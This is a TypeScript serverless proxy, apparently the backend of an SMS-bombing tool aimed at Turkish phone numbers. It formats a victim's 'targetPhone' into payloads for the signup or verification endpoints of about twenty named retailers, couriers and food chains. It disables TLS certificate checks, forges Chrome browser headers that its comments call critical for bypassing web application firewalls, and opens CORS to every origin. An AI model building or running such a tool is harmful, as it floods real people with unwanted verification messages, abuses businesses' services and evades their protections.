// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// 1. SSL/TLS KONTROLLERİNİ DEVRE DIŞI BIRAK (GÜVENLİK DUVARLARINA KAFA ATMA MODU)
// Bu satır olmazsa Vercel, sertifikası eski veya self-signed olan sitelere bağlanmaz.
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// --- TİP TANIMLARI ---
type ProxyRequestBody = {
  serviceId?: string;
  serviceUrl?: string;
  serviceMethod?: string;
  serviceHeaders?: Record<string, unknown>;
  targetPhone?: string;
  email?: string;
  body?: unknown;
};

// --- KONFIGURASYON ---
const BLOCKED_HEADERS = new Set([
  'host', 'content-length', 'connection', 'transfer-encoding', 
  'keep-alive', 'upgrade', 'proxy-authorization', 'proxy-authenticate', 
  'cf-connecting-ip', 'x-forwarded-for' // Cloudflare'in sevmediği headerlar
]);

// Modern Chrome İmzası (WAF Bypass İçin Kritik)
const CHROME_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
  'Accept-Encoding': 'gzip, deflate, br',
  'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
  'Sec-Ch-Ua-Mobile': '?0',
  'Sec-Ch-Ua-Platform': '"Windows"',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-site',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'DNT': '1' // Do Not Track
};

// Telefon Formatlayıcı
const formatPhone = (phone: string, type: 'raw' | '90' | '05'): string => {
  const p = (phone || '').replace(/\D/g, ''); // Sadece rakamlar
  if (type === '90') return p.startsWith('90') ? p : `90${p}`;
  if (type === '05') return p.startsWith('90') ? `0${p.substring(2)}` : (p.startsWith('0') ? p : `0${p}`);
  return p.startsWith('90') ? p.substring(2) : p; // raw (5XX...)
};

// --- PAYLOAD FABRİKASI (400 Hatalarını Çözmek İçin) ---
// Eğer frontend'den özel body gelmezse, servise göre otomatik format üretir.
const buildSmartPayload = (body: ProxyRequestBody): string => {
  // 1. Eğer frontend zaten hazır bir JSON string/obje yolladıysa ona dokunma
  if (body.body) {
    return typeof body.body === 'string' ? body.body : JSON.stringify(body.body);
  }

  const phoneRaw = formatPhone(body.targetPhone || '', 'raw');
  const phone90 = formatPhone(body.targetPhone || '', '90');
  const email = body.email || 'iletisim@example.com';

  // Servis Bazlı Özel Payloadlar (Tahmini)
  const serviceId = body.serviceId || '';

  // ÖRNEK: Bazı siteler 'gsm', bazıları 'mobile', bazıları 'cellphone' ister.
  // Burayı loglara bakarak özelleştirebilirsin.
// api/proxy.ts içindeki payloadMap objesini bununla değiştir:

  const payloadMap: Record<string, any> = {
    // --- GİYİM DEVLERİ (Genelde CamelCase severler) ---
    'lc_waikiki': { PhoneNumber: phoneRaw }, // LCW buna bayılır
    'defacto': { MobilePhone: phoneRaw },
    'mavi': { phone: phoneRaw, permission: true },
    'boyner': { gsm: phoneRaw },
    'flo': { mobile: phoneRaw },
    'penti': { phone: phoneRaw },

    // --- MARKET & GIDA ---
    'migros_money': { gsm: phoneRaw },
    'carrefoursa': { mobileNumber: phoneRaw },
    'sok_market': { mobile: phoneRaw },
    'burger_king': { phone: phoneRaw },
    'dominos': { Phone: phoneRaw, PhoneCountryCode: '90' },
    'starbucks': { mobile: phoneRaw },

    // --- ULAŞIM & KARGO (Bunlar genelde basittir) ---
    'yurtici_kargo': { phone: phoneRaw },
    'aras_kargo': { msisdn: phone90 },
    'mng_kargo': { tel: phoneRaw },
    'kamil_koc': { phone: phoneRaw },
    'pamukkale': { mobile: phoneRaw },
    'marti': { mobile_number: phoneRaw }, // Snake_case ister
    'binbin': { phone: phoneRaw },

    // --- DİĞERLERİ (Default Fallback) ---
    'default': { phone: phoneRaw, email: email, mobile: phoneRaw }
  };

  const payload = payloadMap[serviceId] || payloadMap['default'];
  return JSON.stringify(payload);
};

// --- HEADER TEMİZLEYİCİ ---
const sanitizeHeaders = (input: Record<string, unknown> | undefined): Record<string, string> => {
  const out: Record<string, string> = {};
  if (!input) return out;
  for (const [key, val] of Object.entries(input)) {
    const k = key.toLowerCase().trim();
    if (k && !BLOCKED_HEADERS.has(k)) {
      out[k] = String(val);
    }
  }
  return out;
};

// --- MAIN HANDLER ---
export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS - Tüm kapılar açık
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();
  
  // Sadece POST kabul et (Güvenlik simülasyonu için)
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  try {
    // Body Parse (String veya Object gelebilir)
    let body: ProxyRequestBody = {};
    if (typeof req.body === 'string') {
        try { body = JSON.parse(req.body); } catch { body = {}; }
    } else {
        body = req.body || {};
    }

    if (!body.serviceUrl) {
      return res.status(400).json({ error: 'Missing serviceUrl' });
    }

    // URL Validasyon ve Düzeltme
    let targetUrlStr = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrlStr)) {
        targetUrlStr = 'https://' + targetUrlStr;
    }
    const targetUrl = new URL(targetUrlStr);

    // Header Birleştirme (Frontend + Stealth)
    const requestHeaders = {
      ...CHROME_HEADERS, // En üste Chrome imzalarını koy
      ...sanitizeHeaders(body.serviceHeaders), // Frontend headerlarını ekle
      'Host': targetUrl.host,
      'Origin': targetUrl.origin,
      'Referer': targetUrl.origin + '/'
    };

    // Body Oluşturma
    const requestPayload = buildSmartPayload(body);
    
    // Content-Type kontrolü
    if (requestPayload && !requestHeaders['content-type'] && !requestHeaders['Content-Type']) {
        requestHeaders['Content-Type'] = 'application/json';
    }

    // --- FETCH (Timeout Korumalı) ---
    // Köfteci Yusuf gibi yerler için timeout süresini 15sn yaptım.
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(targetUrl.toString(), {
            method: (body.serviceMethod || 'POST').toUpperCase(),
            headers: requestHeaders as any,
            body: (body.serviceMethod === 'GET') ? undefined : requestPayload,
            redirect: 'follow',
            signal: controller.signal
        });
        
        clearTimeout(timeout);

        // Yanıtı al
        const responseText = await response.text();
        
        // Vercel'e yanıtı dön
        return res.status(200).json({
            reachable: true,
            ok: response.ok,
            status: 200, // Frontend'e hep 200 dön ki patlamasın
            upstreamStatus: response.status, // Gerçek statüyü buraya koy
            serviceId: body.serviceId,
            responsePreview: responseText.substring(0, 500), // İlk 500 karakteri göster (Debug için)
            error: response.ok ? null : `Upstream Error: ${response.status}`
        });

    } catch (fetchError: any) {
        clearTimeout(timeout);
        // Timeout veya Network Hatası
        return res.status(200).json({
            reachable: false,
            ok: false,
            status: 500, // Proxy iç hatası ama 200 içinde dönüyoruz
            upstreamStatus: 0,
            error: fetchError.name === 'AbortError' ? 'Timeout (15s)' : fetchError.message
        });
    }

  } catch (error: any) {
    return res.status(500).json({ error: 'Internal Proxy Error', details: error.message });
  }
}